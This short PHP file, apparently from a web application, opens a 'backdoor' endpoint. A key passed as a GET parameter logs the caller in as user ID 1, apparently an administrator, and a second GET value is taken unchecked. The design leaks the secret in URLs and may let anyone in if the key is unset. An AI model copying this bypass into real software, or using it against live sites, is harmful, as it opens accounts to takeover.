<?php
require_once('../includes/config.php');

if($_GET['backdoor'] !== $bot_backdoor_key)
{
    exit();
}

$user_id = $_GET['user_id'];

session_start();
$_SESSION['logged'] = true;
$_SESSION['userID'] = 1;
$_SESSION['adminOnlyForUser'] = intval($user_id);